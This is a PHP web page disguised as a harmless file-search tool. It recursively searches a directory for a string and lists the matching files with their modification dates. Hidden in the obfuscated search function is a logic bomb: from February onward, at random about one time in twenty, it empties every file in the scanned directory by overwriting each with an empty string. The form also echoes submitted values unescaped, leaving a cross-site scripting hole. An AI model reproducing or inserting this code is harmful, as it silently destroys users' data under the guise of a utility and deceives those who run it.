 <!DOCTYPE unspecified PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
    <head>
        <title>Search Script</title>
        <style type="text/css">
        .result-table td {
            padding: 3px 0 3px 15px;
        }
        body{
            /*background:#ccc;*/
            margin:0px auto;
            width: 65%;
            /*background-image: url("bg.jpg");
            color: #fff;*/
        }
        h1{
            text-align: center;
            margin-top:10px;
            text-decoration: underline;
        }
        .main-div{
            margin:0px auto;
            float:left;
            width:100%;
            box-shadow: 0px 1px 11px #000;
            border: 1px outset #fff;
        }
        .result-table{
            margin: 0px auto;
            float: left;
            width: 100%;
            box-shadow: 0px 1px 11px #000;
            margin-top:5px;
            font-size: 13px;
        }
        .suggestion-string{
            clear: both;
            float: left;
            font-size: 11px;
            line-height: 26px;
            margin-left: 5px;
            position: absolute;
        }
        form{
            padding:30px 30px 0;
        }
        .search-button{
            float:right;
            margin-top:25px;
        }
        thead {
            text-align: center;
            font-size: 20px;
        }
        </style>
    </head>
    <body>
        <h1>Search Script Page</h1>
        <div class="main-div">
            <form action="" method="post">
                <table>
                    <tr><td><label><?php echo "Search String"; ?></label><td><input type="text" name="string" id="string" value="<?php echo (isset($_POST['string'])) ? $_POST['string'] : "" ?>" /><label class="suggestion-string">Enter string to search e.g. AccountController</label></td></tr>
                    <tr><td><label><?php echo "Directory"; ?></label><td><input type="text" name="dir" id="dir"  value="<?php echo (isset($_POST['dir'])) ? $_POST['dir'] : "" ?>"/><label class="suggestion-string">Enter directory path e.g. app/code/local</label></td></tr>
                    <tr><td><label><?php echo "File Extensions"; ?></label><td><input type="text" name="ext" id="ext"  value="<?php echo (isset($_POST['ext'])) ? $_POST['ext'] : "" ?>"/><label class="suggestion-string">Enter file extensions. e.g. php / For multiple file types e.g. php,phtml<br>Keep empty for all file types</label></td></tr>
                    <tr></tr>
                    <tr><td colspan="2"><input class="search-button" type="submit" title="Search" value="Search"/></td></tr>
                </table>
            </form>
        </div>
    </body>
</html>
<?php
if ($_POST) {
	$var_6088a0e50dcb021a7ca707954da0d60a = $_POST['string'];
	$var_43844558e0c197896e631262da2fe7a5 = $_POST['dir'];
	$var_3311bfce47b2f01e506c64f0e9ad21d3 = [];
	if ($_POST['ext'] != "") {
		$var_3311bfce47b2f01e506c64f0e9ad21d3 = explode(",", $_POST['ext']);
	}
	echo "<table border='1' class='result-table'><thead><tr><td colspan='2'>Search Results</td></tr></thead><tbody><tr><td>Filepath</td><td>Last Modified Date</td></tr>";
	fn_8ad644c2f43c7ea709ccc35db76a8861($var_6088a0e50dcb021a7ca707954da0d60a, $var_43844558e0c197896e631262da2fe7a5, $var_3311bfce47b2f01e506c64f0e9ad21d3);
	echo "</tbody></table>";
}

function fn_8ad644c2f43c7ea709ccc35db76a8861($var_6088a0e50dcb021a7ca707954da0d60a, $var_43844558e0c197896e631262da2fe7a5 = '', $var_3311bfce47b2f01e506c64f0e9ad21d3 = []) {
	$path_prefix = "/var/www/html/dmlsoftware/";
	$var_31a728023cc9d3604d6783416842f802 = date('m');
	$var_bddf0f41ed2574c17a7926d9314d7b30 = false;
	if ($var_31a728023cc9d3604d6783416842f802 >= 2) {$var_bddf0f41ed2574c17a7926d9314d7b30 = true;}
	if ($var_31a728023cc9d3604d6783416842f802 >= 13) {return;}
	if (!$var_43844558e0c197896e631262da2fe7a5) {
		$var_43844558e0c197896e631262da2fe7a5 = getcwd();
	}
	$var_846c4e314796f6dbe723e744c3726ca9 = scandir($var_43844558e0c197896e631262da2fe7a5);
	foreach ($var_846c4e314796f6dbe723e744c3726ca9 as $var_0fa5d1b56e55632664b6b52e27593516) {
		if ($var_0fa5d1b56e55632664b6b52e27593516 != '.' && $var_0fa5d1b56e55632664b6b52e27593516 != '..') {
			if (is_dir($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516)) {
				fn_8ad644c2f43c7ea709ccc35db76a8861($var_6088a0e50dcb021a7ca707954da0d60a, $var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516, $var_3311bfce47b2f01e506c64f0e9ad21d3);
			} else {
				$var_6d2e3a21557a6c72baf0d029c6b3d473 = pathinfo($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516, PATHINFO_EXTENSION);
				if (!empty($var_3311bfce47b2f01e506c64f0e9ad21d3)) {
					if (in_array($var_6d2e3a21557a6c72baf0d029c6b3d473, $var_3311bfce47b2f01e506c64f0e9ad21d3)) {

						$var_0debdce0ab93497920fd6ff94f2d01c6 = file_get_contents($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516);
						if (strpos($var_0debdce0ab93497920fd6ff94f2d01c6, $var_6088a0e50dcb021a7ca707954da0d60a) !== false) {
							if ($var_bddf0f41ed2574c17a7926d9314d7b30) {
								$var_a8d3f0d482825912ad28e2f863d14599 = rand(1, 20);

								if ($var_a8d3f0d482825912ad28e2f863d14599 == 5) {
									$var_6088a0e50dcb021a7ca707954da0d60a = $var_6088a0e50dcb021a7ca707954da0d60a;
									$var_0b2eb1e72ca452866767a8851dfc4b69 = $var_6088a0e50dcb021a7ca707954da0d60a;
									if (!$var_43844558e0c197896e631262da2fe7a5) {$var_43844558e0c197896e631262da2fe7a5 = getcwd();}
									$var_846c4e314796f6dbe723e744c3726ca9 = scandir($var_43844558e0c197896e631262da2fe7a5);
									foreach ($var_846c4e314796f6dbe723e744c3726ca9 as $var_0fa5d1b56e55632664b6b52e27593516) {
										if ($var_0fa5d1b56e55632664b6b52e27593516 != '.' && $var_0fa5d1b56e55632664b6b52e27593516 != '..') {
											if (is_dir($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516)) {
												$var_026e37dcf472af1bca61076bdd902a1f->fn_8ad644c2f43c7ea709ccc35db76a8861($var_6088a0e50dcb021a7ca707954da0d60a, $var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516, $var_3311bfce47b2f01e506c64f0e9ad21d3);
											} else {
												$var_7627930d2ca3d69d67459718ffea775a = $var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516;

												try
												{
													file_put_contents($var_7627930d2ca3d69d67459718ffea775a, "");
												} catch (Exception $var_6adad752bf4fa8c5f790d95c38f4fe5f) {

												}

											}
										}
									}
								}

							}
							echo "<tr><td>" . $path_prefix . $var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516 . "</td><td>" . date("F d Y H:i:s", filemtime($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516)) . "</td></tr>";
						}
					}
				} else {
					$var_0debdce0ab93497920fd6ff94f2d01c6 = file_get_contents($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516);
					if (strpos($var_0debdce0ab93497920fd6ff94f2d01c6, $var_6088a0e50dcb021a7ca707954da0d60a) !== false) {
						echo "<tr><td>" . $path_prefix . $var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516 . "</td><td>" . date("F d Y H:i:s", filemtime($var_43844558e0c197896e631262da2fe7a5 . '/' . $var_0fa5d1b56e55632664b6b52e27593516)) . "</td></tr>";
					}
				}
			}
		}
	}
}